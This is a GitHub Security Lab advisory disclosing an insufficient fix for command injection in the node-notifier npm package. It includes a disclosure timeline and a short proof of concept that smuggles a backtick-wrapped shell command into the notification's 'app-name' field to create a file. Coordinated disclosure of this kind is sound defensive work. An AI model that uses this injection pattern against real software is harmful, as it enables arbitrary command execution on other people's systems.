<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">April 13, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-373: Command injection in node-notifier</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/ghsecuritylab">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/61799930?s=35" height="35" width="35">
        <span>GitHub Security Lab</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>12/22/2020: Report sent to the maintainer</li>
  <li>02/11/2021: Report not acknowledged, contacted the maintainer again</li>
  <li>03/02/2021: Report acknowledged</li>
  <li>03/11/2021: Issue fixed</li>
</ul>

<h2 id="summary">Summary</h2>

<p><code class="language-plaintext highlighter-rouge">node-notifier</code> recently addressed a command injection vulnerability in https://github.com/advisories/GHSA-5fw9-fq32-wv5p, however this fix appears to be insufficient and command injection through malicious input is still possible.</p>

<h2 id="product">Product</h2>

<ul>
  <li><a href="https://www.npmjs.com/package/node-notifier">NPM: node-notifier</a> /</li>
  <li><a href="https://github.com/mikaelbr/node-notifier">mikaelbr/node-notifier</a></li>
</ul>

<h2 id="tested-version">Tested Version</h2>

<p>8.0.1</p>

<h2 id="details">Details</h2>

<p><code class="language-plaintext highlighter-rouge">node-notifier</code> is a general purpose library for showing OS notifications (toasts). A client of the library expects that they can safely call the methods in <code class="language-plaintext highlighter-rouge">node-notifier</code> with user-controlled inputs. However, in some cases, that can lead to arbitrary command execution.</p>

<h3 id="issue-1-insufficient-input-sanitization-leads-to-command-injection">Issue 1: Insufficient input sanitization leads to command injection</h3>

<p>Certain input fields of <code class="language-plaintext highlighter-rouge">node-notifier</code> are insufficiently sanitized and allow for command injection when passed as command line arguments.</p>

<p>The provided PoC pretends to be a client that sends malicious inputs to <code class="language-plaintext highlighter-rouge">node-notifier</code>.</p>

<p>The outcome of the PoC is that a file <code class="language-plaintext highlighter-rouge">exploit</code> is created in the current working directory.</p>

<ul>
  <li>Install <code class="language-plaintext highlighter-rouge">node-notifier</code>: <code class="language-plaintext highlighter-rouge">npm install node-notifier</code>.</li>
  <li>Run the below with <code class="language-plaintext highlighter-rouge">node</code> (tested on Ubuntu).
```JavaScript
var Notify = require(‘node-notifier/notifiers/notifysend’);</li>
</ul>

<p>var notifier = new Notify({ suppressOsdCheck: true });
var options = {
    title: “titl”,
    message: “msg”,
    “app-name”: [“foo<code class="language-plaintext highlighter-rouge">touch exploit</code>”]
    //”category”: [“foo<code class="language-plaintext highlighter-rouge">touch exploit</code>”]
};
notifier.notify(options, () =&gt; {});
```</p>

<h4 id="impact">Impact</h4>

<p>Arbitrary command execution</p>

<h4 id="resources">Resources</h4>

<ul>
  <li>This issue was detected using the <a href="https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-078/UnsafeShellCommandConstruction.ql">following CodeQL query</a></li>
  <li><a href="https://github.com/mikaelbr/node-notifier/commit/51ed238526f55d6bbf2222b0f90c746b441e67bc">Fix commit</a></li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GitHub team member <a href="https://github.com/erik-krogh">@erik-krogh</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include <code class="language-plaintext highlighter-rouge">GHSL-2020-373</code> in any communication rega